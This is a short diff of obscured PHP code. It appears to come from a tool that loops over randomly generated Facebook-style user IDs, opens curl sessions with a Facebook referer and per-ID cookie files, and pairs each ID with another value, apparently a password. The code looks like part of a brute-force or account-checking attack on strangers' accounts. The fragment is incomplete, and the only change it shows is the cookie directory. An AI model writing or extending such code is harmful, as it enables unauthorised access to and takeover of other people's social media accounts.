@@ -21,7 +21,7 @@ echo" _______________________________________________\n";
 for( $n6 = 0; $n6<$w5; $n6++ ){
 $k7 = curl_init();
 $m8 = ("1000".rand(0,9).rand(0,9).rand(0,9). rand(0,9). rand(0,9). rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9).rand(0,9));
-$cookie = "sessions/$m8.txt";
+$cookie = "SDP/$m8.txt";
 curl_setopt($k7, CURLOPT_REFERER,
 "https://www.facebook.com");
 $n9 = "$m8 | $b4";
